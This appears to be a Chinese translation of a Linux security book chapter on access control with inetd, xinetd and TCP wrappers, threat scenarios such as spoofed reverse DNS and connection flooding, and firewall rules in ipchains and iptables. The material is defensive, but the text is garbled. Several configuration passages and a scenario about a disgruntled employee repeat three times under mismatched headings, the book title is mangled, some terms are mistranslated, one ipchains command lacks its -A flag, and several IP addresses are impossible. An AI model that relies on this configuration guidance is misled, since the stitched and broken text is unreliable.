- 2. 配置你的 浏览器以拒绝目录列表，仅允许从特定目录执行 CGI 程序，并禁止使用“..”（来引用父目录）。
- 3. 永远不要使用从网上找到 CGI 程序，并在编写这些程序时避免做出任何假设。
- 4. 永远不要调用 `system()` 函数或 `exec()` 函数，除非作为列表调用，并且不要打开管道。
- 5. 定期检查 Web 服务器日志文件。请参第 2 章关于有助于你完成此任务的若干工具的讨论。

# 第 13 章

![](img/33829ffb1435b4baef56fcd2c28ec6cd_490_0.png)

# Linux 破解破解：Linux 安全秘密与解决方案

如果你的计算机连接到互联网，你就会容易受到黑客攻击。你的机器向互联网提供的服务越多（如 HTTP、FTP、telnet 等），你允许连接到你服务的机器越多，你就越容易受到攻击。因此，为了度地减少你的脆弱性，你应该限制提供的服务，并通过实施互联网访问控制和防火墙来减少受服务的机器数量。

本章将描述通过使用 `inetd`/TCP wrappers 和 `xinetd` 设置互联网访问控制来应对的攻击。此外，还将讨论使用 `ipchains` 和 `iptables` 实现防火墙，并介绍几种防火墙产品。

# INETD 和 XINETD 概述

Linux 允许你提供多种互联网服务，包括 HTTP、SMTP、telnet 和 FTP。你的 Linux 机器提供的许多服务由 `inetd`（互联网守护进程）或 `xinetd`（扩展互联网守护进程）控制。`inetd` 已经存在很长时间，是大多数 UNIX 变体用于控制互联网服务的守护进程。一个新程序 `inetd` 尚未包含在所有 Linux 发行版中，但你可以在你的机器上下载、编译并安装。

# inetd

许多网络服务由 `inetd`（互联网守护进程）启动，第 6 章对其进行了详细讨论。它的目的是监听机器上的特定端口，如果建立了到其中一个端口的连接，它就会启动相应的互联网服务。例如，如果建立了到端口 23 的连接，`inetd` 会启动 telnet 守护进程处理请求。同样，当用户尝试通过端口 21 向主主机进行 ftp 时，`inetd` 会启动一个 ftp 进程。

为了确定相应的服务，`inetd` 会在 `/etc/services` 文件中查找请求的端口。以下是该文件的一部分：

| 服务 | 端口 | 协议 | 描述 |
| :--- | :--- | :--- | :--- |
| ftp | 20 | tcp | data |
| ftp | 21 | tcp | ftp |
| ssh | 22 | tcp | ssh |
| telnet | 23 | tcp | telnet |
| pop3 | 110 | tcp | pop3 |
| imap | 143 | tcp | imap |
| http | 80 | tcp | http |
| time | 37 | udp | time |
| echo | 7 | udp | echo |
| discard | 9 | udp | discard |
| list | 13 | udp | list |
| name | 13 | udp | name |
| dayprint | 19 | udp | dayprint |

许多网络服务由 `inetd`（互联网守护进程）启动。当 `inetd` 启动时，它会读取每个服务的配置文件。

# xinetd

正如其名称所示，`xinetd` 是 `inetd` 的扩展或增强版。`xinetd` 中实现了一些 `inetd` 不具备的宝贵功能，包括：

- 类似于 TCP wrappers 的基于远程主机、远程主机名或远程域名的内置访问控制
- 基于时间段的访问控制
- 连接的完整日志，包括成功和失败
- 通过限制同时运行的相同服务器数量、限制服务器总数、限制日志大小以及限制限制发起的连接数来防止 DOS
- 将服务绑定到特定的接口（例如，内部接口而非外部接口）

# 配置 xinetd

`xinetd` 的一个负面方面是其配置语法与 `inetd` 的语法完全不同。这意味着必须学习并实现另一种语法。为了方便从 `inetd` 迁移到 `xinetd`，编写非常有用的 Perl 程序 `xconv.pl`，它可以将 `/etc/inetd.conf` 转换为 `/etc/xinetd.conf`。将 `/etc/inetd.conf` 重定向到其标准输入，标准输出将是新配置，如下所示：

```bash
# /usr/local/sbin/xconv.pl < /etc/inetd.conf > /etc/xinetd.conf
```

`/etc/xinetd.conf` 的格式是一个默认部分，随后是每个服务的部分，如下：

```xinetd
defaults

{

    attribute operator value(s)

}

service ftp

{

    attribute operator value(s)

}
```

例如，让我们转换一个只有服务 ftp 和 telnet 的 `inetd` 配置：

```inetd
ftp stream tcp nowait root /usr/sbin/in.ftpd -l -a
telnet stream tcp nowait root /usr/sbin/in.telnetd
```

程序 `xconv.pl` 创建了以下 `/etc/xinetd.conf`（大量的注释已被剪裁）：

```xinetd
defaults

{

    instances = 25

    log_type = FILE /var/log/servicelog

    log_on_success = HOST PID

}
```

```
log_on_failure = HOST RECORD

per_source = 5

}

service ftp

{

  flags = REUSE NAMEINARGS

  socket_type = stream

  protocol = tcp

  wait = no
```



```
  user = root

  server = /usr/sbin/in.ftpd

  server_args = -1 -a

}
service telnet
{
  flags = REUSE NAMEINARGS
  socket_type = stream
  protocol = tcp
  wait = no
  user = root
  server = /usr/sbin/in.telnetd
  server_args = 
}
```

`defaults` 部分的字段代表以下含义：

| 字段 | 定义 |
| --- | --- |
| instances |此值是服务器可以同时处理的请求最大数。 |
| log_type | 在这种情况下，我们将日志记录到文件中，xinetd 同时也允许使用 SYSLOG。 |
| log_on_success / log_on_failure | 我们可以选择连接成功或失败时记录几条信息，包括 PID、HOST 和 USERID。 |
| per_source |此值是来自特定 IP 地址到某个服务的最大连接数。 |

`service` 部分的字段通常是自显其懂的，允许我们配置套接字类型、使用的协议、执行服务的用户以及传递给服务的参数。

在完成此转换后，我们通常会切出 ftp 和 telnet 部分，并将它们放在 `/etc/xinetd.d` 目录下的独立文件中。这些文件通常命名为 `/etc/xinetd.d/telnet` 和 `/etc/xinetd.d/wu-ftpd`。如果我们选择将这两个服务的配置移动到该目录下的文件中，我们必须在 `/etc/xinetd.conf` 中添加以下行：
`includedir /etc/xinetd.d`

从 inetd 到 xinetd 转换的最后一步是通过修改 `/etc/rc.d` 中的相应脚本来执行重启。

# 不需要的黑客连接

| 流行度: | 9 |
| --- | --- |
| 简单性: | 8 |
| 影响力: | 9 |
| 风险等级 | 9 |

如果你有正在运行的服务——如果你的机器连接了网络，你很可能是这样——那么早晚，黑客都会尝试探测这些服务。其中某些服务在被滥用之前需要身份验证。然而，这些服务可能存在无需任何身份验证即可被利用的漏洞。

也许黑客已经通过其他其他手段（如社会工程学）发现了有效的用户名和密码。如果她尝试用有效账户 telnet 到你的机器，你的计算机无法区分合法用户和入侵者，因此无法阻止她成功登录。

# 使用 inetd 和 TCP Wrappers 实现访问控制

TCP wrappers 是由 Wietse Venena 编写的，其意义在于，由于 TCP wrapper 守护进程 `tcpd` 正如 `/etc/inetd.conf` 所示，它被“包裹”在服务周围。`tcpd` 会干预连接，并验证尝试连接的主机是否允许连接到该主机上的服务。`tcpd` 通过将请求与主机上定义的规则（定义在 `/etc/hosts.allow` 和 `/etc/hosts.deny` 中，在本章稍后会详细讨论）对比来验证这一点，如果请求通过了规则，则允许连接。如果请求未通过规则，则拒绝连接。

让我们看看安装了 `tcpd` 的机器上的 `/etc/inetd.conf` 部分内容：

```
ftp      stream tcp    nowait root    /usr/sbin/tcpd in.ftpd -1 -a
telnet   stream tcp    nowait root    /usr/sbin/tcpd in.telnetd
shell    stream tcp    nowait root    /usr/sbin/tcpd in.rshd
pop-3    stream tcp    nowait root    /usr/sbin/tcpd ipop3d
```

# 第 13 章：访问控制与防火墙

注意 `/usr/sbin/tcpd` 被“包裹”在 `in.ftpd`、`in.telnet`、`in.rsh` 中，当尝试连接这四个服务之一时，将会检查 `tcpd` 规则。

# TCP Wrappers 规则

TCP wrappers 使用两个文件实现：`etc/hosts.allow` 和 `/etc/hosts.deny`。当远程机器尝试连接到 Linux 服务器时，`tcpd` 首先在 `/etc/hosts.allow` 文件中查找机器的 IP 名称或 IP 地址。如果远程机器在 `/etc/hosts.allow` 中被授予访问其尝试连接的服务，则授予访问。如果远程机器匹配 `/etc/hosts.deny` 中的条目，则被拒绝访问。如果机器不匹配 `/etc/hosts.allow` 或 `/etc/hosts.deny` 中的任何规则，则允许连接。

`/etc/hosts.allow` 和 `/etc/hosts.deny` 文件由零行或多行文本组成。这些文本行按照出现的顺序从上到下进行处理。一旦找到匹配项，处理就会终止。

长行可以折断——以反斜杠 (`\`) 结尾表示它在下一行继续。此外，空行和以井号 (`#`) 开头的行会被忽略，这允许你通过空行和注释使文件更易读。

`/etc/hosts.allow` 和 `/etc/hosts.deny` 的行遵循以下格式：

```
daemon_list : client_list [ shell_command ]
```

`ALL` 是一个通配符。TCP wrappers 支持以下通配符：

- `ALL` 匹配所有客户端。
- `LOCAL` 匹配任何不包含点号 (`.`) 的客户端。
- `UNKNOWN` 匹配任何名称或地址未知的客户端（谨慎使用！）。
- `KNOWN` 匹配任何名称和地址已知的客户端（谨慎使用：由于主机问题可能暂时不可用）。
- `PARANOID` 匹配任何名称与其地址不匹配的客户端。

因此，为了防止 telnet 攻击，在 `/etc/hosts.deny` 中设置 `ALL: ALL` 将拒绝黑客的 telnet 连接。如果有允许使用 telnet 连接，我们可以在 `/etc/hosts.allow` 文件中添加此内容：

```
telnet: server1.example.com
```

# 使用 xinetd 进行主机访问控制

xinetd 的最重要的改进之一是它不再需要使用 TCP wrappers，因为访问控制已内置在 xinetd 中。可以对服务进行以下访问控制：

- 与 TCP wrappers 类似的控制：
基于 IP 地址的控制
基于 IP 名称的控制
基于域名的控制

访问时间控制（例如，你可以将 ftp 访问限制在早上 8 点到下午 5 点）。

在前面的使用 `inetd` 控制主机的示例中，`/etc/hosts.deny` 的内容拒绝所有客户端的所有服务：

`ALL: ALL`

而 `/etc/hosts.allow` 允许所有这些服务：

```
ALL: 127.0.0.1 trusted.machine,example.com .example.com
ipop3d: ALL
telnetd: server1.example.com
```



要使用 `xinetd` 拒绝所有机器对所有服务的访问，相当于在 `/etc/hosts.deny` 中设置 `ALL:ALL` 是在 `/etc/xinetd.conf` 的 `defaults` 部分中使用 `no_access` 属性：

```
no_access = 0.0.0.0
```

`0.0.0.0` 匹配所有 IP 地址（类似于 TCP wrappers 中的 `ALL`）。

另一种方法是使用 `only_from` 属性并不给该属性分配任何值：

```
only_from =
```

这种方法更好，因为稍后我们将添加要连接的特定主机。因此，我们将从设置 `only_from` 为空开始。

要使用 `xinetd` 实现允许特定主机的访问，相当于在此 `/etc/hosts.allow` 中的选择：

```
ALL: 127.0.0.1 trusted.machine.example.com .example.com

ipop3d: ALL
```

我们可以将 `only_from` 分配在 `defaults` 部分或每个服务的部分中。在我们的示例中，由于我们正在为几台机器授予 ALL 服务的连接权限，我们将在 `defaults` 部分进行操作：

```
only_from = 127.0.0.1 trusted.machine.example.com .example.org
```

如果我们选择，可以在每个文本中添加特定的 IP 地址或名称。要向 `only_from` 添加值，必须使用 `+=` 运算符。在我们的示例中，我们将允许 `ipop3d` 访问所有机器，因此我们在 `ipop3d` 配置部分添加了以下行：

```
only_from += 0.0.0.0
```

现在，我们的防御措施（拒绝来自黑客的 telnet 连接并仅允许来自 `server1.example.com` 的 telnet 连接）需要在 `telnet` 服务部分中添加以下内容：

```
only_from += server1.example.com
```

## 第 13 章：访问控制与防火墙

提示 我们可以使用 `access_times` 属性限制时间段的访问：`access_times=8:00 - 17:00`

### 伪造“信任”的反向 DNS 条目

| 流行度: | 7 |
| 简单性: | 10 |
| 影响: | 8 |
| 风险等级 | 7 |

黑客知道你的 wrapper 机器所在的域名。他可能假设你的域中的所有机器都允许 TCP wrapper 访问，这通常是事实。因此，他可能会尝试为他的主机反向 DNS 条目使其显示在你的域名中，如下：

```
hackmachine$ host hackmachine.example.com

hackmachine.example.com has address 192.168.15.10

hackmachine$ host 192.168.15.10
```

10.15.168.192.IN-ADDR.ARPA 域名指针 trusted.target_network.com

> 黑客希望进入 `target_network.com`，他设置了他的反向 DNS 条目使其显示在信任域中。

### 伪造反向 DNS 条目的防御措施

这种攻击对于没有采取一个简单预防措施的软件非常有效：同时检查正向和反向 DNS 查询。TCP wrappers 查找 IP 地址（192.168.15.10（上述情况）），如下所示它返回 `trusted.target_network.com`。然而，TCP wrapper 库随后查找 `trusted.target_network.com`：

```
target$ host target_network.com

target_network.com has address 10.28.62.502
```

由于反向和正向映射不匹配，TCP wrapper 库将不允许 `/etc/hosts.allow` 中的任何主机名匹配。

注意 软件曾犯过不检查反向 DNS 的错误。因此，如果你编写或下载了一个 socket 程序，请用 TCP wrappers 包装它，它将保护你免受此漏洞的侵害。如果你自己开发网络程序，可以通过链接 TCP wrapper 库来自动包含 TCP wrapper 支持（即使对于不依赖 `inetd` 的守护程序）。我们将在本章后面提供此方面的示例。

# 破解 Linux 暴露：Linux 安全秘密与解决方案

当 TCP wrappers 使用 `-DPARANOID` 选项编译时，它们将丢弃任何正向和反向 DNS 条目不匹配的机器的连接。这让许多无法修复其 DNS 条目的系统管理员警觉。然而，拥有匹配的记录是你开始相信主机确实是其声称的身份的唯一方法。毕竟，如果管理员不能保持其记录同步，你如何信任这些系统呢？

如果你自己编译 TCP wrappers，请指定 `-DPARANOID` 选项。大多数发行版默认如此。

### 信任域中的攻击者

| 流行度: | 4 |
| 简单性: | 10 |
| 影响: | 9 |
| 风险等级 | 8 |

你怀疑 IP 为 `trouble.example.org` 的员工准备离开公司。他有些心存不满，并一心想要损害公司。你想保护你的数据不被盗取。

#### 锁定域中的主机

要使用 `xinetd` 实现允许特定主机的访问，相当于在此 `/etc/hosts.allow` 中的选择：

```
ALL: 127.0.0.1 trusted.machine.example.com .example.com

ipop3d: ALL
```

我们可以将 `only_from` 分配在 `defaults` 部分或每个服务的部分中。在我们的示例中，由于我们正在为几台机器授予 ALL 服务的连接权限，我们将在 `defaults` 部分进行操作：

```
only_from = 127.0.0.1 trusted.machine.example.com .example.org
```

如果我们选择，可以在每个文本中添加特定的 IP 地址或名称。要向 `only_from` 添加值，必须使用 `+=` 运算符。在我们的示例中，我们将允许 `ipop3d` 访问所有机器，因此我们在 `ipop3d` 配置部分添加了以下行：

```
only_from += 0.0.0.0
```

现在，我们的防御措施（拒绝来自黑客的 telnet 连接并仅允许来自 `server1.example.com` 的 telnet 连接）需要在 `telnet` 服务部分中添加以下内容：

```
only_from += server1.example.com
```

## 第 13 章：访问控制与防火墙

注意 软件曾犯过不检查反向 DNS 的错误。因此，如果你编写或下载了一个 socket 程序，请用 TCP wrappers 包装它，它将保护你免受此漏洞的侵害。如果你自己开发网络程序，可以通过链接 TCP wrapper 库来自动包含 TCP wrapper 支持（即使对于不依赖 `inetd` 的守护程序）。我们将在本章后面提供此方面的示例。

#### 锁定域中的主机

要使用 `xinetd` 实现允许特定主机的访问，相当于在此 `/etc/hosts.allow` 中的选择：

```
ALL: 127.0.0.1 trusted.machine.example.com .example.com

ipop3d: ALL
```

我们可以将 `only_from` 分配在 `defaults` 部分或每个服务的部分中。在我们的示例中，由于我们正在为几台机器授予 ALL 服务的连接权限，我们将在 `defaults` 部分进行操作：

```
only_from = 127.0.0.1 trusted.machine.example.com .example.org
```

如果我们选择，可以在每个文本中添加特定的 IP 地址或名称。要向 `only_from` 添加值，必须使用 `+=` 运算符。在我们的示例中，我们将允许 `ipop3d` 访问所有机器，因此我们在 `ipop3d` 配置部分添加了以下行：

```
only_from += 0.0.0.0
```

### 非 inetd/xinetd 的攻击

| 流行度: | 6 |
| 简单性: | 8 |
| 影响: | 6 |
| 风险等级 | 7 |

并不是所有的互联网服务都是由 `inetd` 发起的。一个例子是 `Ssh`。

你怀疑 IP 为 `trouble.example.org` 的员工准备离开公司。他有些心存不满，并一心想要损害公司。你想保护你的数据不被盗取。

#### 锁定域中的主机

要使用 `xinetd` 实现允许特定主机的访问，相当于在此 `/etc/hosts.allow` 中的选择：

```
ALL: 127.0.0.1 trusted.machine.example.com .example.com

ipop3d: ALL
```



## 编译 TCP 支持

当 TCP wrappers 使用 `-DPARANOID` 选项编译时，它们将丢弃任何正向和反向 DNS 条目不匹配的机器的连接。这让许多无法修复其 DNS 条目的系统管理员警觉。然而，拥有匹配的记录是你开始相信主机确实是其声称的身份的唯一方法。毕竟，如果管理员不能保持其记录同步，你如何信任这些系统呢？

如果你自己编译 TCP wrappers，请指定 `-DPARANOID` 选项。大多数发行版默认如此。

# 编写不当的 TCP Wrapper 规则滥用

| 流行度 | 4 |
| --- | --- |
| 简单性 | 6 |
| 影响 | 8 |
| 风险等级 | 6 |

你已经实现了 TCP wrappers 并向 `/etc/hosts.deny` 和 `/etc/hosts.allow` 添加了规则，但 TCP wrappers 似乎并没有正常工作。希望你确定这一点的是因为你正在手动检查允许的连接，但通常你是在通过惨痛的方式发现的——当攻击者开始攻击本应被阻止的网络服务时。

TCP wrappers 无法正确拒绝访问通常是因为某个配置文件中存在拼写错误。

# 检查 TCP Wrapper 的有效性

`tcpdchk` 和 `tcpdmatch` 程序是用于验证 `/etc/inetd.conf`、`/etc/hosts.allow` 和 `/etc/hosts.deny` 中定义的 TCP wrapper 规则的工具。

### 使用 tcpdchk 验证你的 TCP Wrappers
`tcpdchk` 程序检查 TCP wrapper 配置，并报告它能找到的所有真实和潜在问题。`tcpdchk` 程序检查 `/etc/hosts.allow` 和 `/etc/hosts.deny`，并将其条目与 `/etc/inetd.conf` 进行比较。

```
tcpdchk [-a] [-d] [-i inetd.conf]
```

`tcpdchk` 报告的问题包括：

- 不存在的路径
- 出现在 `/etc/hosts.allow` 和 `/etc/hosts.deny` 中但未受 `tcpd` 控制的服务（例如 `httpd`）
- 不应被封装的服务
- 不存在的主机名
- 错误的 IP 地址格式
- 具有名称/地址冲突的主机
- 通配符使用语法错误

# 破解 Linux Linux：Linux 安全秘密与解决方案

此外，`tcpdchk` 经常提供有关如何修复问题的信息。
`tcpdchk` 的选项包括：

| 选项 | 定义 |
| --- | --- |
| -a | 报告在没有显式 ALLOW 的情况下允许访问的访问控制规则（仅在编译 TCP wrappers 时使用了 -PROCESS_OPTIONS 时使用）。 |
| -d | 使用当前目录下的 `/etc/hosts.allow` 和 `/etc/hosts.deny` 文件。 |
| -i inet_conf | 使用 `inet_conf` 代替 `/etc/inetd.conf`。 |
| -v | 使用详细模式。 |

### 使用 tcpdmatch 检查 TCP Wrapper 配置
`tcpdmatch` 程序检查 TCP wrapper 配置并预测服务请求将如何被处理。`tcpdmatch` 检查访问控制表 `/etc/hosts.allow` 和 `/etc/hosts.deny` 以及 `/etc/inetd.conf`。当 `tcpdmatch` 找到匹配时，它会打印匹配的规则以及任何相关的 shell 命令。`tcpdmatch` 的语法为

```
tcpdmatch [-d] [-i inet_conf] daemon client
```

`tcpdmatch` 的选项包括：

| 选项 | 定义 |
| --- | --- |
| -d | 使用当前目录下的 `/etc/hosts.allow` 和 `/etc/hosts.deny` 文件。 |
| -i inet_conf | 使用 `inet_conf` 代替 `/etc/inetd.conf`。 |

以下是当 localhost 尝试 telnet 时检查 TCP wrapper 配置的示例：

```
machine# tcpdmatch in.telnet localhost

client: hostname localhost

client: address 127.0.0.1

server: process in.telnet

matched: /etc/hosts.allow line 7

access: granted
```

以下是当 123.266.7.8 尝试 SSH 时检查 TCP wrapper 配置的示例：

```
machine# tcpdmatch sshd 123.266.7.8

warning: sshd: no such process name in /etc/inetd.conf

client: address 123.266.7.8

server: process sshd

matched: /etc/hosts.deny line 11

access: denied
```

第二个示例中的“no such process name”是因为 `sshd` 是一个独立的守护进程，不是由 `inetd` 用的。因此，这是预期的。你可以使用 `sshd -i` 从 `inetd` 运行 sshd，但这会导致巨大的性能影响，因为每个 ssh 服务器必须使用自己的随机数生成器并创建临时密钥。这是一项大量的工作，并且花费相当长的处理时间；大多数人倾向于在守护模式中使用 `sshd`。

# 第 13 章：访问控制与防火墙

# 针对 inetd 的资源耗尽攻击

| 流行度 | 6 |
| --- | --- |
| 简单性 | 6 |
| 影响 | 8 |
| 风险等级 | 6 |

使用 TCP wrappers 为 telnet 提供了主机控制。然而，黑客可以访问一台允许连接到你机器的机器。在没有用户名/密码的情况下，黑客决定通过向你的机器发起数千次 telnet 连接来启动资源耗尽攻击。这些连接消耗了资源和进程，导致你的机器过载，从而无法响应 HTTP 或 FTP 等有效连接。

# 使用 tcpserver 防御耗尽

如果你没有使用 `inetd`，可以使用 `tcpserver` 限制到服务的连接数。该程序允许你执行主机控制，并提供与 TCP wrappers 相同的控制。与 `inetd` 不同，你为你想要支持的每个连接运行一个 `tcpserver`。你可以在 http://www.hackinglinuxexposed.com/tcpserver.html 找到 `tcpserver`。

# 使用 inetd 防御耗尽

`inetd` 有两个内置功能可以帮助解决资源耗尽问题：

- 限制每个服务的并发连接总数。
- 限制每个 IP 地址到单个服务的总连接数。

# 破解 Linux Linux 安全秘密与解决方案

这两个功能在章节的早些时候当我们把 `/etc/inetd.conf` 转换为 `/etc/xinetd.conf` 时自动配置了。当我们运行此程序时，它将这些行放在了默认部分：

```
instances = 25

per_source = 5
```



在此配置中，`instances` 值限制了每个服务的并发连接数（换句话说，同时只有 25 个 `telnet` 会话）。`per_source` 值限制了从单个 IP 地址到单个服务的并发连接数。

# 防火墙：内核级访问控制

简单来说，防火墙防止火灾蔓延。类比之下，防火墙就像完全将建筑的一个区域与另一个区域隔离开。同样，互联网防火墙的目的是保护我们的机器（或局域网）免受网络空间的影响。为了提供这种保护，防火墙需要将黑客挡在我们的网络之外，同时允许有效用户访问。此外，防火墙可以通过限制他们可以进行的活动来将人们留在内部。防火墙比使用 `TCP wrappers` 或 `inetd` 更安全，因为防火墙可以阻止黑客到达我们的端口。理想的情况是防火墙位于建筑的一侧，防止其进入我们。

关于推荐的防火墙书籍列表，请参阅 `www.hackinglinuxexposed.com`。

![](img/33829ffb1435b4ef56cd2c28ec607)

## 防火墙的类型

有两种主要的防火墙：

- 应用程序代理服务器理解特定的协议并代表建立网络连接。通常包含内容过滤（例如阻止 JavaScript）。
- 数据包过滤防火墙根据源或目的选择性地接受或拒绝数据包。它们通常不理解底层协议，因此不检查内容。

## 第 13 章：访问控制与防火墙

许多防火墙（尤其是商业版本）是两种防火墙的混合体。这些通常被称为状态数据包过滤器，因为它们维护状态以支持 `FTP` 等协议，它们基于数据包过滤器，因此处理速度更快。

## 代理服务器

代理服务器用于控制或监控出流量。最常见的类型是用户必须登录才能执行某种互联网活动。例如，如果局域网内的用户想要连接到 `test.example.com`，她会首先登录代理服务器，然后从代理服务器连接到 `test.example.com`。

```
machine$ telnet proxy.example.org

Connected to proxy.example.org

proxy login: proxyuser

proxy password: ******

proxy> telnet test.example.com

Connected to test.example.com
```

Red Hat Linux release 6.1 (Cartman)
Kernel 2.2.12-20 on an i686
login:

代理服务器将其活动记录到日志文件中。这些活动可以包括下载的文件和访问的 URL。

## 数据包过滤防火墙

通过网络发送的数据不是作为一个大块发送的，而是以单个数据包的形式发送。数据包的开头称为头部告诉数据包去哪里、来自哪里、类型以及其他管理信息。头部之后是数据，称为主体。目标机器上的内核模拟数据包的数据以提供原始数据流。

## Linux 数据包过滤

在 Linux 中，数据包过滤构建在内核中。数据只有匹配一组规则（过滤器）才允许通过防火墙。当数据包到达时，它们根据其类型（`telnet`, `ftp`）、源地址、源端口、目的地址和目的端口进行过滤。

## 478 攻破 Linux 暴露：Linux 安全秘密与解决方案

用于设置防火墙的程序取决于所使用的内核版本。如果你运行的是内核版本 2.2，你将使用 `iptchains` 来构建你的防火墙。如果你运行的是内核版本 2.4，那么你将使用 `iptables`。

在我们编写此书时，2.4 内核刚刚发布，尚未被包含在各种发行版中。因此，本书的大多数读者可能正在运行 2.2 内核，所以我们将在示例中集中于使用 `iptchains`。

数据包过滤器检查数据包的头部，并决定对数据包执行以下三种操作之一：

- `接受（Accept）`数据包，允许数据包通过
- `拒绝（Reject）`数据包，丢弃数据包并通知源端过滤器已拒绝了该请求
- `拒绝（Deny）`数据包，丢弃数据包，就像过滤器从未见过它一样

### 接受数据包

以下是一个配置为接受 SMTP 端口连接的机器示例。这显示我们被允许连接，并且 `sendmail` 对我们做出了响应：

```
machine$ telnet mail.example.com 25

Trying 192.168.1.2...

Connected to mail.example.com.

Escape character is '*'

220 mail.example.com SMTP Sendmail 8.11.0/8.11.0; Wed, 21 Feb 2001 20:43:09 -0600
```

### 拒绝数据包

以下是一个设置为拒绝 SMTP 端口连接的机器示例。这个示例说明我们无法连接到该端口，并且我们被通知已被拒绝：

```
machine$ telnet mail.example.com 25

Trying 192.168.1.2...

telnet: Unable to connect to remote host: Connection refused
```

### 丢弃数据包

以下是一个程序化为拒绝 SMTP 端口连接的机器示例。这个示例显示当尝试尝试连接时，尝试会一直挂起。我们没有收到无法连接的通知；事实上，我们什么都没有得到。我们只是等待一个最终会超时的连接，或者我们失去耐心并终止连接：

```
machine$ telnet mail.example.com 25

Trying 192.168.1.2...

(connection hangs for over a minute).
```



# 第 13 章：访问控制与防火墙

这些示例说明了创建数据包过滤防火墙时最有效的策略是丢弃数据包。这阻止了潜在黑客访问我们机器的端口，并且不会告诉他发生了什么——他不会注意到自己被拒绝了，连接将一直挂起直到超时（这极大减慢了端口扫描的速度）。

## iptables 与 ipchains 的区别

Linux 2.4 数据包过滤被从头重写以变得更加强大。该系统被称为 Netfilter，你用于控制规则集的程序是 `iptables`。`iptables` 与 `ipchains` 类似，但有几差异。一旦了解这些差异，从 `ipchains` 迁移到 `iptables` 就会很简单。这些差异包括：

- 内置链名称现在是大大写的（例如 `INPUT`, `OUTPUT`, `FORWARD`）。
- `-i` 标志指向连接接口；`-o` 指向输出接口。
- TCP 和 UDP 端口现在需要 `--source-port` 或 `--sport` 以及 `--destination-port` 或 `--dport` 选项，并且必须放在 `-p tcp` 或 `-p udp` 之后。
- `-y` 标志现在是 `-syn` 且必须放在 `-p tcp` 之后。
- `DENY` 被 `DROP` 替换。
- `MASQ` 现在是 `MASQUERADE` 并使用不同的语法。
- 状态检测（本章稍后将讨论）现在无需内核模块即可支持。

如果你想获得更多关于 Netfilter 的信息，可以在 http://kernelnotes.org/ 找到优秀的文档。

如果你在用 `ipchains` 创建防火墙上花费了大量精力，只要你在内核中包含 `ipchains.o` 模块，它在内核 2.4 中仍然有效。更好的是查看 http://kernelnotes.org/ 上的 `iptables HOWTO` 以获取将 `ipchains` 转换为 `iptables` 的方法。

## 状态检测

`iptables` 引入的最重大变化之一是状态检测的概念。状态防火墙不仅检查源 IP 地址和目的 IP 地址以及端口号，还监控所使用的通信协议，以确保通信遵循连接规则。例如，如果状态防火墙允许从内部机器连接到远程机器上的 HTTP，防火墙将监控该连接，以确保远程机器 80 端口上的程序遵循 HTTP 协议。

## 攻破 Linux 暴露：Linux 安全秘密与解决方案

状态防火墙确保我们向远程机器发送了遵循 HTTP 协议的 GET、POST 或 HEAD。然后，它确保远程机器返回包含 HTTP 响应头和正文的文本。

> 注意：状态防火墙确保我们连接到远程机器的 80 端口时，我们实际上是在运行 HTTP，而不是某些恰好运行在该机器 HTTP 端口上的破坏性程序。它为允许进入我们网络的响应数据包提供了额外保护。然而，控制两个端点的更复杂的黑客可以仅仅通过修改其协议使其看起来像 HTTP。事实上，这种对开放 HTTP 端口的操作被日益滥用，即使是像 SOAP 这样的“官方”协议也是如此。

## 阻止特定的网络访问

我们现在将说明一个安全防火墙的开端，其旨在阻止对我们机器上特定端口的访问。这些示例将使用 `ipchains`（内核 2.2）和 `iptables`（内核 2.4）展示。这些示例可以用于创建一个健壮的防火墙。

### 尝试 ping 或 traceroute 到机器

| 流行性 | 8 |
| :--- | :--- |
| 简单性 | 8 |
| 影响 | 8 |
| 风险 | 8 |

在第 3 章中，我们讨论了 ping 和 traceroute 是发现网络可用主机的两种简单方法。通过阻止这些服务，可以使黑客无法出现在雷达上。这是一个被防火墙拦截后正常响应的机器 ping 示例：

```
hbox# ping 192.168.1.102

PING 192.168.1.102 (192.168.1.102) from 10.5.5.108 : 56(84) bytes of data.

---

192.168.1.102 ping statistics ---

5 packets transmitted, 0 packets received, 100% packet loss
```

### 使用 ipchains 拒绝 ICMP ping 和 traceroute

对于 2.2 内核，我们将使用 `ipchains` 拒绝 ICMP ping 请求（也称为 ICMP echo 请求）。`ipchains` 程序执行如下：

```
/sbin/ipchains -s 0/0 echo-request -d 192.168.1.102 -p icmp -j DENY
```

`-A` 选项允许 `ipchains` 向规则集中添加以下规则，它检查到达机器的每个数据包。该命令指定对于源自（s）任何 IP 地址（0/0）的 ICMP echo 请求类型数据包，目标（d）为机器 192.168.1.102（我们的机器），使用 ICMP 协议（p），跳转到（j）`DENY`。这将导致所有指向我们机器的 ICMP echo 请求被拒绝。

现在，当黑客进行 ping 时，连接失败了：

```
hackerbox# ping -c 5 192.168.1.102

PING 192.168.1.102 (192.168.1.102) from 10.5.5.108 : 56(84) bytes of data.

---

192.168.1.102 ping statistics ---

5 packets transmitted, 0 packets received, 100% packet loss
```

对于端口 33435 到 33525 的 UDP 包 traceroute：

```
/sbin/ipchains -A input -s 0/0 -d 192.168.1.102 -p udp 33435:33525 -j DENY
```

注意我们正在指定端口范围为 33435:33525。

当黑客尝试进行 traceroute 时，输出类似于：

```
machine# traceroute 192.168.1.102

traceroute to 192.168.1.102 (192.168.1.102), 30 hops max, 38 byte packets

1 hacker-firewall.hacker_er.edu (192.168.2.1) 2.892 ms 2.803 ms 2.746 ms

2 hacker-gateway.hacker_er.edu (171.678.90.1) 3.881 ms 3.789 ms 3.686 ms

(more hops deleted)

12 cisco.example.com (254.192.1.20) 158.884 ms 161.422 ms 160.884 ms

13 veloci.example.com (192.168.1.1) 168.650 ms 183.821 ms 173.287 ms

14 * *

15 * *

16 * *
```

我们成功地阻止了数据包被我们的机器 192.168.1.102 ；然而，攻击者和我们之间的其他机器仍然像以前一样做出响应。理想情况下，您应该配置您使用的所有机器也拒绝这些数据包。

我们阻止的端口是 UNIX traceroute 使用的标准端口。其他实现方式可能会有所不同。

#### 使用 iptables 防火墙拒绝连接

之前，我们详细介绍了 ipchains 和 iptables 之间的区别。要将我们的 ipchains 命令转换为阻止 ping 和 traceroute 的命令，我们只需进行以下更改：

- 将 ipchains 改为 iptables。
- 将 input 改为 INPUT。
- 在 echo-request 之前插入 `--icmp-type`。
- 移动端口号和数据包类型 `-p`，并在端口号前加上 `--port` 或 `--dport`。
- 将 DENY 改为 DROP。

将这些更改应用于我们阻止 ping 的 ipchains，我们创建了以下 iptables 命令：

```
/sbin/iptables -A INPUT -s 0/0 -d 192.168.1.102 -p icmp \
  --icmp-type echo-request -j DROP
```

丢弃 traceroute 数据包：

```
